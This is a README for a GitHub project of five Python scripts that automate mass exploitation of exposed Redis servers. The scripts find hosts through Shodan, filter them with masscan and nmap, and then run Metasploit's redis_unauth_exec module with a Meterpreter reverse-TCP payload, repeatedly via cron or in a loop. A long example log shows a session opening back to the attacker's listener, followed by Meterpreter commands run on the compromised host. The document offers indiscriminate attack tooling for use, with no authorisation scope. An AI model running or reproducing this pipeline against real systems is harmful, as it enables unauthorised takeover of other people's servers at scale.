# redis_unauth_exec_automation_script

> v0.0.1

A batch processing and automation python script for Redis Unauthenticated Code Execution.


### Description
1. Here are 5 python scripts, each one can be used independently.
2. These scripts can transfer data through the sqlite database.
3. These scripts could be added to the cron task and run every few hours, or run in an infinite loop.
4. Data flow: shodan api -> sqlite -> python-masscan -> sqlite -> python-nmap -> sqlite -> pymetasploit -> sqlite.

### Installation
```bash
git clone https://github.com/r0x1/redis_unauth_exec_automation_script
cd redis_unauth_exec_automation_script
pip install -r requirements.txt
```

### Usage
#### 1_get_ip_from_shodan.py
1. Change the code "_SHODAN_API_KEY = "xxxxxxxxxxxxxxxxxxxxxxxxxx" to your own shodan api key.
    
    ```python
    _SHODAN_API_KEY = "xxxxxxxxxxxxxxxxxxxxxxxxxx"
    ```
2. Execute it to get host ip address from shodan, via searching "product:redis", then save ip and port of hosts into a sqlite table called "shodan_data".
    
    ```bash
    root@kali:/# python3 1_get_ip_from_shodan.py
    ``` 
#### 2_prase_shodan_data_to_ip_all_table.py
Prase the result from shodan api, then save all of ip data into a sqlite table called "ip_all".

```bash
root@kali:/# python3 2_prase_shodan_data_to_ip_all_table.py
```

#### 3_filter_ip_all_table_to_active_redis_table.py
Filter hosts which are active/alive from the "ip_all" table, via the MASSCAN (python-masscan), then save them into the "redis_active" table.

```bash
root@kali:/# python3 3_filter_ip_all_table_to_active_redis_table.py
```

#### 4_filter_active_redis_table_to_target_redis_table.py
Filter the banner information of a redis (port: 6379) , via the NMAP (python-nmap), query data from "redis_active" table, and insert data into the "redis_target" table.

```bash
root@kali:/# python3 4_filter_active_redis_table_to_target_redis_table.py
```

#### 5_exploit_target_redis_table.py
1. Change the code
    ```python
    # reverse connection IP address and port of your host
    gl_lhost = '127.0.0.1'
    gl_lport = '80'
    # public network IP address and port of your host
    gl_srvhost = '127.0.0.1'
    gl_srvport = '6379'
    ```
2. Call METASPLOIT (pymetasploit3) to exploit the target host, which the redis version between 4.x.x - 5.x.x in "redis_target" table. 
    ```bash
    root@kali:/# python3 5_exploit_target_redis_table.py
    ```
3.  If it succeeds, that means you got a redis shell, you can find the results in the "redis_target" table. BTW, the all detail information of exploit are stored in "payload_info" field.
    ```
    SELECT * FROM redis_target where is_exploited=1
    ```

### Example : 

```bash
root@kali:/# python3 5_exploit_target_redis_table.py 
==============================================
|  5_exploit_target_redis_table.py (v0.0.1)  |
|    redis_unauth_exec_automation_script     |
|          https://github.com/r0x1/          |
==============================================
sqlite connected.
************************************************** gl_p_exploit is None, new Process gl_p_exploit.start() **************************************************
rhosts: xxx.xxx.xxx.xxx , rport: 6379
kill: (6903): 没有那个进程
kill msfrpcd.
kill: (6909): 没有那个进程
[*] MSGRPC starting on 127.0.0.1:55553 (NO SSL):Msg...
[*] MSGRPC backgrounding at 2020-02-11 20:37:25 +0800...
[*] MSGRPC background PID 6920
exploit() time.sleep(10)
MsfRpcClient
exploit = client.modules.use('exploit', 'linux/redis/redis_unauth_exec')
exploit.runoptions:  {'VERBOSE': False, 'WfsDelay': 0, 'EnableContextEncoding': False, 'DisablePayloadHandler': False, 'EXE::EICAR': False, 'EXE::Inject': False, 'EXE::OldMethod': False, 'EXE::FallBack': False, 'MSI::EICAR': False, 'MSI::UAC': False, 'SRVHOST': 'aa.bb.cc.dd', 'SRVPORT': '6379', 'SSL': False, 'SSLCompression': False, 'TCP::max_send_size': 0, 'TCP::send_delay': 0, 'RPORT': '6379', 'SSLVersion': 'Auto', 'SSLVerifyMode': 'PEER', 'ConnectTimeout': 10, 'ShowProgress': True, 'ShowProgressPercent': 10, 'HTTP::no_cache': False, 'HTTP::chunked': False, 'HTTP::header_folding': False, 'HTTP::junk_headers': False, 'HTTP::compression': 'none', 'HTTP::server_name': 'Apache', 'SendRobots': False, 'CMDSTAGER::FLAVOR': 'auto', 'CMDSTAGER::SSL': False, 'PASSWORD': 'foobared', 'READ_TIMEOUT': 2, 'CUSTOM': True, 'RHOSTS': 'xxx.xxx.xxx.xxx'}
exploit host [xxx.xxx.xxx.xxx:6379]...
VERBOSE => false
WfsDelay => 0
EnableContextEncoding => false
DisablePayloadHandler => false
EXE::EICAR => false
EXE::Inject => false
EXE::OldMethod => false
EXE::FallBack => false
MSI::EICAR => false
MSI::UAC => false
SRVHOST => aa.bb.cc.dd
SRVPORT => 6379
SSL => false
SSLCompression => false
TCP::max_send_size => 0
TCP::send_delay => 0
RPORT => 6379
SSLVersion => Auto
SSLVerifyMode => PEER
ConnectTimeout => 10
ShowProgress => true
ShowProgressPercent => 10
HTTP::no_cache => false
HTTP::chunked => false
HTTP::header_folding => false
HTTP::junk_headers => false
HTTP::compression => none
HTTP::server_name => Apache
SendRobots => false
CMDSTAGER::FLAVOR => auto
CMDSTAGER::SSL => false
PASSWORD => foobared
READ_TIMEOUT => 2
CUSTOM => true
RHOSTS => xxx.xxx.xxx.xxx
payload => linux/x64/meterpreter/reverse_tcp
VERBOSE => false
LPORT => 80
ReverseAllowProxy => False
ReverseListenerThreaded => False
StagerRetryCount => 10
StagerRetryWait => 5
AutoLoadStdapi => True
AutoVerifySession => True
AutoVerifySessionTimeout => 30
AutoSystemInfo => True
EnableUnicodeEncoding => False
SessionRetryTotal => 3600
SessionRetryWait => 10
SessionExpirationTimeout => 604800
SessionCommunicationTimeout => 300
AutoUnhookProcess => False
PingbackRetries => 0
PingbackSleep => 30
PayloadUUIDTracking => False
EnableStageEncoding => False
StageEncodingFallback => True
PrependFork => false
PrependSetresuid => false
PrependSetreuid => false
PrependSetuid => false
PrependSetresgid => false
PrependSetregid => false
PrependSetgid => false
PrependChrootBreak => false
AppendExit => false
MeterpreterDebugLevel => 0
LHOST => aa.bb.cc.dd
[*] Started reverse TCP handler on aa.bb.cc.dd:80 
[*] xxx.xxx.xxx.xxx:6379    - Compile redis module extension file
[+] xxx.xxx.xxx.xxx:6379    - Payload generated successfully! 
[*] xxx.xxx.xxx.xxx:6379    - Listening on aa.bb.cc.dd:6379
[*] xxx.xxx.xxx.xxx:6379    - Rogue server close...
[*] xxx.xxx.xxx.xxx:6379    - Sending command to trigger payload.
[*] Sending stage (3021284 bytes) to xxx.xxx.xxx.xxx
[*] Meterpreter session 1 opened (aa.bb.cc.dd:80 -> xxx.xxx.xxx.xxx:60850) at 2020-01-16 14:22:14 +0000
[!] xxx.xxx.xxx.xxx:6379    - This exploit may require manual cleanup of './xxxxxx.so' on the target
[*] Session 2 created in the background.

maybe got session
sessions.list:  dict_keys(['1', '2'])
select session : [2], length: 1
? to list help banner
?
meterpreter_run_sleep_echo() time.sleep(3)

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    chmod         Change the permissions of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    shell         Drop into a system command shell
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Stdapi: Mic Commands
====================

    Command       Description
    -------       -----------
    listen        listen to a saved audio recording via audio player
    mic_list      list all microphone interfaces
    mic_start     start capturing an audio stream from the target mic
    mic_stop      stop capturing audio


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play an audio file on target system, nothing written on disk


>>>>>>>>>> got meterpreter shell <<<<<<<<<<
rm xxxxx.so
meterpreter_run_sleep_echo() time.sleep(1)

ls -al
meterpreter_run_sleep_echo() time.sleep(3)
Listing: /tmp
=============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  265    fil   2020-02-04 23:08:07 +0800  admin
100644/rw-r--r--  266    fil   2020-02-10 10:05:47 +0800  apache
100644/rw-r--r--  266    fil   2020-02-10 10:05:07 +0800  redis
100644/rw-r--r--  266    fil   2020-02-10 10:05:21 +0800  tomcat
100644/rw-r--r--  265    fil   2020-02-04 23:08:18 +0800  user
100644/rw-r--r--  265    fil   2020-02-04 23:08:46 +0800  web
100644/rw-r--r--  265    fil   2020-02-04 23:08:31 +0800  www
100644/rw-r--r--  266    fil   2020-02-10 10:05:34 +0800  www-data


rm *.so
meterpreter_run_sleep_echo() time.sleep(1)
[-] stdapi_fs_delete_file: Operation failed: 1

ls -al
meterpreter_run_sleep_echo() time.sleep(3)
Listing: /tmp
=============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  265    fil   2020-02-04 23:08:07 +0800  admin
100644/rw-r--r--  266    fil   2020-02-10 10:05:47 +0800  apache
100644/rw-r--r--  266    fil   2020-02-10 10:05:07 +0800  redis
100644/rw-r--r--  266    fil   2020-02-10 10:05:21 +0800  tomcat
100644/rw-r--r--  265    fil   2020-02-04 23:08:18 +0800  user
100644/rw-r--r--  265    fil   2020-02-04 23:08:46 +0800  web
100644/rw-r--r--  265    fil   2020-02-04 23:08:31 +0800  www
100644/rw-r--r--  266    fil   2020-02-10 10:05:34 +0800  www-data


sysinfo
meterpreter_run_sleep_echo() time.sleep(2)
Computer     : 192.111.0.5
OS           : Debian 8.9 (Linux X.X.X-XXX-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux

ifconfig
meterpreter_run_sleep_echo() time.sleep(2)

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0


Interface  4
============
Name         : eth0
Hardware MAC : 00:00:00:00:00:00
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.111.0.5
IPv4 Netmask : 255.255.0.0


>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> update redis_target table... host xxx.xxx.xxx.xxx is_exploited = 1 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
kill msfrpcd.
------------------------------  done.  ------------------------------
```
